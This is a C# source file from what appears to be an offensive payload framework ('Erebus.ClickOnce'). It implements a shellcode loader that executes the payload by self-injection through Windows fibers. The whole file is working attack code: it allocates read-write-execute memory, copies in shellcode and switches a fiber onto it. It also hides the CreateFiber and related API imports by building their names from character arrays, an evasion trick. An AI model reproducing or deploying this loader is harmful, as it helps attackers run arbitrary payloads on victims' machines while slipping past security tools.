using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using Erebus.ClickOnce.Evasion;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class CreateFiberInjection : IInjectionMethod
    {
        public string Name => "DoMakeFib";
        public string Description => "Self-injection using fiber-based execution";

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnCttf(IntPtr lpParameter);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnCf(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate void FnStf(IntPtr lpFiber);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate void FnDf(IntPtr lpFiber);

        private static readonly Lazy<FnCttf> _convert =
            DynamicApi.LazyDelegate<FnCttf>(DynamicApi.Kernel32,
                new[] { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r' });
        private static readonly Lazy<FnCf> _create =
            DynamicApi.LazyDelegate<FnCf>(DynamicApi.Kernel32,
                new[] { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r' });
        private static readonly Lazy<FnStf> _switch =
            DynamicApi.LazyDelegate<FnStf>(DynamicApi.Kernel32,
                new[] { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r' });
        private static readonly Lazy<FnDf> _delete =
            DynamicApi.LazyDelegate<FnDf>(DynamicApi.Kernel32,
                new[] { 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'b', 'e', 'r' });

        private static IntPtr DoConvFib(IntPtr lp) => _convert.Value(lp);
        private static IntPtr DoMakeFib(uint s, IntPtr a, IntPtr p) => _create.Value(s, a, p);
        private static void   DoSwFib(IntPtr f)               => _switch.Value(f);
        private static void   DoDelFib(IntPtr f)                 => _delete.Value(f);

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                // Allocate memory for shellcode
                IntPtr baseAddress = Win32.DoAllocEx(
                    (Win32.HANDLE)Win32.GetCurrentProcess(),
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] alloc step failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Copy shellcode to allocated memory
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                // Convert current thread to fiber
                IntPtr mainFiber = DoConvFib(IntPtr.Zero);

                if (mainFiber == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] DoConvFib failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Create a new fiber pointing to shellcode
                IntPtr shellcodeFiber = DoMakeFib(0, baseAddress, IntPtr.Zero);

                if (shellcodeFiber == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] local-start step failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Switch to shellcode fiber
                DebugLogger.WriteLine("[+] Switching to shellcode fiber...");
                DoSwFib(shellcodeFiber);

                // Cleanup (won't reach here if shellcode doesn't return)
                DoDelFib(shellcodeFiber);

                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] local-inject failed: {ex.Message}");
                return false;
            }
        }
    }
}